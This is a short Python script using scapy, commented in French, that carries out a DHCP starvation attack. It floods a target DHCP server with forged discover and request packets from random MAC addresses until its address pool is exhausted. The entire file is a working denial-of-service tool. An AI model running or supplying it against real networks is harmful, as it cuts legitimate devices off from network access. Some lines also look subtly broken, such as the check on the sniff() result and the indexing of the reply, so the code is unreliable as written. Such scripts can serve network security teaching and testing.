from scapy.all import *
import sys

# utiliser le reseau entré pour déduire le nb d'ip possible
nb_requetes = len(Net(sys.argv[2])) - 2

print(f"starvation en cours ({nb_requetes} IPs)...")
for i in range(nb_requetes):

    mac_aleatoire = RandMAC()
    transaction_id = RandInt()

    # discover
    paquet = IP(src="0.0.0.0", dst="255.255.255.255")
    udp    = UDP(sport=68, dport=67)
    bootp  = BOOTP(chaddr=mac_aleatoire, xid=transaction_id)
    dhcp   = DHCP(options=[("message-type","discover"), "end"])
    discover = paquet/udp/bootp/dhcp

    # on envoie et on attend l'offer
    send(discover, verbose=0)
    offer = sniff(filter="udp and port 68", count=1, timeout=2)

    if offer is None:
        continue

    # request
    ip_proposee = offer[BOOTP].yiaddr
    bootp2 = BOOTP(chaddr=mac_aleatoire, xid=transaction_id)
    dhcp2  = DHCP(options=[("message-type","request"), ("server_id", sys.argv[1]), ("requested_addr", ip_proposee), "end"])
    request = paquet/udp/bootp2/dhcp2

    send(request, verbose=0)

print("starvation terminée !")
